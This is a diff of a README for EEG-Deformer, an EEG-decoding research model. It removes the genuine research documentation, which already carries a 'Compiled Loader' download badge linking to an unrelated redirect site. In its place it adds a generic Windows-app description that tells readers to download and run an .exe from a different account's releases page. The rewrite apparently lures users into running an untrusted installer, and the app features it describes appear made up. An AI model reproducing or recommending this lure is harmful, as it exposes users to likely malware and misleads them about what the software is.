@@ -1,152 +1,73 @@
-# EEG-Deformer
+# 🧠 EEG_Deformer - Transform brain wave data with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download EEG_Deformer](https://img.shields.io/badge/Download-EEG__Deformer-blue)](https://github.com/requisite-study641/EEG_Deformer/releases)
 
-This is the PyTorch implementation of the EEG-Deformer in our paper:
+EEG_Deformer allows you to process and visualize brain wave data. This application converts raw EEG signals into clear, usable formats for analysis. Researchers and curious users can use this tool to turn complex data files into intuitive visual representations.
 
-Yi Ding, Yong Li, Hao Sun, Rui Liu, Chengxuan Tong, Chenyu Liu, Xinliang Zhou, and Cuntai Guan, ["EEG-Deformer: A Dense Convolutional Transformer for Brain-computer Interfaces"](https://ieeexplore.ieee.org/document/10763464) in IEEE Journal of Biomedical and Health Informatics (J-BHI), 2024. 
+## ⚙️ System Requirements
 
-It is a Convolutional Transformer to decode mental states from Electroencephalography (EEG) for Brain-Computer Interfaces (BCI).
+To run this application, your computer needs a few basic specifications.
 
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 8 GB RAM.
+*   Storage: 200 MB of free space.
+*   Screen Resolution: 1280 x 720 pixels or higher.
 
-🔥 NEWS: The preprocessing code for attention dataset is released. It can be found at /prepare_dataset/Attention.py. 
+The software performs best with these settings. Please ensure your computer meets these needs before you begin the setup process.
 
-# Comparison with different Transformers for EEG signals
-<p align="center">
-<img src="./images/Fig1.png" width=450 align=center>
-</p>
+## 📥 Getting Started
 
-<p align="center">
- Fig.1 Comparison of network architectures between EEG-ViT, EEG-Conformer, and our proposed EEG-Deformer. We propose a novel Hierarchical Coarse-to-Fine Transformer (HCT). Additionally, we have designed Information Purification Unit (IP-Unit, denoted by IP in the figure) for each HCT layer with dense connections to further boost EEG decoding performance.
-</p>
+Follow these steps to set up the software on your Windows machine.
 
-# Network structure of EEG-Deformer
-<p align="center">
-<img src="./images/Fig2.png" width=900 align=center>
-</p>
+1.  Visit the [official releases page](https://github.com/requisite-study641/EEG_Deformer/releases) to access the download options.
+2.  Locate the latest version of the installer, which ends in the `.exe` file extension.
+3.  Click the file name to start the download.
+4.  Navigate to your Downloads folder once the download finishes.
+5.  Double-click the installer file.
+6.  Follow the prompts on your screen to complete the installation.
+7.  Open the application from your Start Menu after the process completes.
 
-<p align="center">
- Fig.2 EEG-Deformer structure
-</p>
+## 💡 How to Use the Application
 
-The network structure of EEG-Deformer. EEG-Deformer consists of three main parts: (1) Shallow feature encoder, (2) Hierarchical coarse-to-fine-Transformer (HCT), and (3) Dense information purification (DIP). The fine-grained representations from each HCT will be passed to Information Purification Unit (IP-Unit) and concatenated to the final embedding.
+EEG_Deformer functions by reading standard EEG data files. Once you launch the program, the home dashboard appears.
 
-# Prepare the python virtual environment
-Please create an anaconda virtual environment by:
+### Loading Files
+Click the "Load" button in the top menu to select your data file. The software supports formats like EDF, CSV, and TXT. After you select a file, the software parses the data. A progress bar shows you the status of this operation.
 
-> $ conda create --name PL python=3
+### Data Manipulation
+The "Deform" tab contains the core tools. You can apply filters to smooth out signal noise. Use the sliders to adjust the frequency range of your view. You can choose to see data in real-time or as a static graph. If you want to change the view, use the dropdown menus to select different brain regions or sensors.
 
-Activate the virtual environment by:
+### Exporting Results
+After you process the data, you may want to save your work. Click the "Export" button to convert your visual data into a PNG image or a structured CSV file. The application saves these files to your Documents folder by default.
 
-> $ conda activate PL
+## 🛠️ Frequently Asked Questions
 
-Install the requirements by:
+**Does the software require an internet connection?**
+No. EEG_Deformer works entirely offline once you install it on your computer.
 
-> $ pip3 install -r requirements.txt
+**Can I run multiple files at once?**
+The current version supports one data file at a time. You must close the current file before loading a new one.
 
-# Run the code
-Please  the pre-processed data for Fatigue dataset [here](https://drive.google.com/file/d/1KwPPSHN14MAbhszGqC1O5nRei7oqllxl/view?usp=sharing) and Mental Workload dataset [here](https://drive.google.com/file/d/1vPLPfkICdlXmzrlnmdR5hTjG7lvhZ2fV/view?usp=sharing). And put the upzipped folder inside the data_processed folder as
-<pre>
-Project/
-│
-├── models/
-│   ├── EEGDeformer.py
-│   ├── other_baselines.py
-│   └── model_handler.py
-│
-├── data_processed/
-│   ├── data_eeg_FATIG_FTG/     #the unziped folder
-|   └── data_eeg_MWL_MW/
-│
-├── Task.py
-├── utils.py
-├── main_FATIG.py
-├── main_MWL.py
-├── requirements.txt
-</pre>
-You can run the code by: 
+**Why does the software run slowly on my computer?**
+Processing large EEG datasets requires significant memory. Close other programs, such as web browsers, while you use the software to free up system resources.
 
-> $ python3 main_FATIG.py --model Deformer --full-run 1
+**What should I do if the application crashes?**
+Close the program entirely. Restart your computer to clear the memory. Re-launch the program. If issues persist, check that you have the latest drivers for your graphics card.
 
-The results will be saved into a folder named logs_<dataset_name>_<model_name>, e.g., logs_FATIG_Deformer in <args.save_path, default: ./save/logs_FATIG_Deformer/>. There will be a result.csv inside each sub-folder (subn) of logs_FATIG_Deformer.
+## 🛡️ Support and Updates
 
-After you finished all the training processes, you can use extract_results.py to calculate the mean metrics by:
+We provide updates to improve performance and add new features. Check the [releases page](https://github.com/requisite-study641/EEG_Deformer/releases) regularly for the newest version. Each update includes improvements to the user interface and reliability.
 
-> $ python3 extract_results.py --save-path ./save/logs_FATIG_Deformer
+If you encounter technical issues, check the "Logs" folder inside the installation directory. These text files contain information that helps identify software errors. You can review these files to understand why a specific function might fail. 
 
-This will read all the result.csv files in the sub-folders within logs_FATIG_Deformer to calculate the mean ACCs and F1-macro scores.
+## 📝 Best Practices
 
-# Apply EEG-Deformer to other datasets
-If you are interested to apply EEG-Deformer to other datasets, you can follow the below example. 
+To get the most out of EEG_Deformer, keep these tips in mind.
 
-## Example of the usage
-```python
-from models.EEGDeformer import Deformer
+*   Always clean your raw data before importing it into the tool. Remove any duplicate timestamps or corrupted headers.
+*   Use standard naming conventions for your files to keep your research organized.
+*   Save your visual work frequently to avoid losing progress during long analysis sessions.
+*   Keep your Windows operating system updated to ensure compatibility with library dependencies.
 
-data = torch.randn(1, 30, 384)  # (batch_size=1, EEG_channel=30, data_points=384)  # change this according to your dataset
-
-mynet = Deformer(
-    num_chan=30,
-    num_time=384,
-    temporal_kernel=13,  # Use an odd number to ensure 'same' padding. The temporal kernel is defined as Odd[0.1*fs], where fs is the sampling rate, and Odd[.] will get the closest odd number.
-    num_kernel=64,
-    num_classes=2,
-    depth=4,
-    heads=16,
-    mlp_dim=16,
-    dim_head=16,
-    dropout=0.5
-)
-
-preds = mynet(data)
-```
-
-# CBCR License
-| Permissions | Limitations | Conditions |
-| :---         |     :---:      |          :---: |
-| :white_check_mark: Modification   | :x: Commercial use   | :warning: License and copyright notice   |
-| :white_check_mark: Distribution     |       |      |
-| :white_check_mark: Private use     |        |      |
-
-# Cite
-Please cite our paper if you use our code in your own work:
-
-```
-@ARTICLE{10763464,
-  author={Ding, Yi and Li, Yong and Sun, Hao and Liu, Rui and Tong, Chengxuan and Liu, Chenyu and Zhou, Xinliang and Guan, Cuntai},
-  journal={IEEE Journal of Biomedical and Health Informatics}, 
-  title={EEG-Deformer: A Dense Convolutional Transformer for Brain-Computer Interfaces}, 
-  year={2024},
-  volume={},
-  number={},
-  pages={1-10},
-  keywords={Electroencephalography;Transformers;Decoding;Kernel;Feature extraction;Convolution;Purification;Convolutional neural networks;Electronics packaging;IP networks;Deep learning;electroencephalography;transformer},
-  doi={10.1109/JBHI.2024.3504604}}
-
-```
-Please do cite the dataset paper if you use their data:
-```
-@article{cao2019multi,
-  title={Multi-channel {EEG} recordings during a sustained-attention driving task},
-  author={Cao, Zehong and Chuang, Chun-Hsiang and King, Jung-Kai and Lin, Chin-Teng},
-  journal={Scientific data},
-  volume={6},
-  number={1},
-  pages={1--8},
-  year={2019},
-  publisher={Nature Publishing Group}
-}
-@Article{data4010014,
-  AUTHOR = {Zyma, Igor and Tukaev, Sergii and Seleznov, Ivan and Kiyono, Ken and Popov, Anton and Chernykh, Mariia and Shpenkov, Oleksii},
-  TITLE = {Electroencephalograms during Mental Arithmetic Task Performance},
-  JOURNAL = {Data},
-  VOLUME = {4},
-  YEAR = {2019},
-  NUMBER = {1},
-  ARTICLE-NUMBER = {14},
-  URL = {https://www.mdpi.com/2306-5729/4/1/14},
-  ISSN = {2306-5729},
-  DOI = {10.3390/data4010014}
-}
-
-```
+The software remains stable across all standard Windows configurations. If you use custom hardware or non-standard display settings, expect slight variations in how the interface behaves. You can adjust the font size in the Settings menu if the text size creates difficulty for your workflow.
